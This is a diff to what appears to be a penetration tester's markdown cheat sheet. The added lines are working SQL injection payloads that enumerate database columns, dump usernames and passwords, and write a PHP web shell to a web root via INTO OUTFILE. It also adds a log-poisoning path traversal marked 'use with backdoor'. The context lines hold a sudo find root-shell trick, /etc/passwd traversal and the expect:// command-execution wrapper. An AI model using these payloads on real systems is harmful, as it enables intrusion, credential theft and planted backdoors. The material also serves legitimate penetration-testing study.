@@ -83,9 +83,15 @@
 	  - Form methods
 	  - Login forms
 		  - Versions/names/brands etc
-		  - Basic sql injection
-        - ``` ‘or 1=1```
-        - ```union```
+		  - Basic-ish sql injection
+		    - ``` ‘or 1=1```
+		    - ```union```
+		      - ```  ' UNION ALL SELECT 1,2,3,4,5,6; -- ```
+		      - ```' UNION SELECT 1,2,3,4,user(),6; -- ```
+		      - ``` union all select 1,2,3,4,<?php echo shell_exec($_GET['cmd']);?>,6 into OUTFILE C:\\xampp\\htdocs\\naughty.php ```
+		      - ``` union all select 1,2,3,4,column_name,6 FROM information_schema.columns where table_name='users' ```
+		      - ``` union select 1,2,3,4,concat(name,0x3a,password),6 FROM users ```
+		      
 - Port 3389
   - ```rdesktop -z Target_IP:PORT```
   - Screen shot login screen
@@ -107,11 +113,11 @@
 		- ctrl+z backgrounds the shell on local box
 		-then type:
 		  - ```ssty raw -echo```
-			- ```fg```
-			- ```reset```
-			- if size is an issue type:
-			  - ```stty size``` (returns current window size)
-				- ```stty -rows 48 -columns 120``` (eg size)
+		  - ```fg```
+		  - ```reset```
+		  - if size is an issue type:
+		  - ```stty size``` (returns current window size)
+		  - ```stty -rows 48 -columns 120``` (eg size)
 - Priv esc linux
   - try ```sudo su``` or ```sudo -l```
 	- If ```find``` has sudo ```sudo find /home -exec sh -i \;```
@@ -193,6 +199,7 @@
   - ```http://testsite.com/get.asp?f=/etc/passwd```
 	- Note above errors for clues on file locations etc....
   - ```foo.php?file=../../../../../../../etc/passwd```
+  - ``` ../../../../../../../xampp/apache/logs/access.log%00 ``` < use with backdoor
   - PHP ```expect:``` #Not enabled by default, uses expect wrapper to execute commands
   	- ```http://127.0.0.1/fileincl/example1.php?page=expect://ls```
   - PHP (POST request) ```php://input```
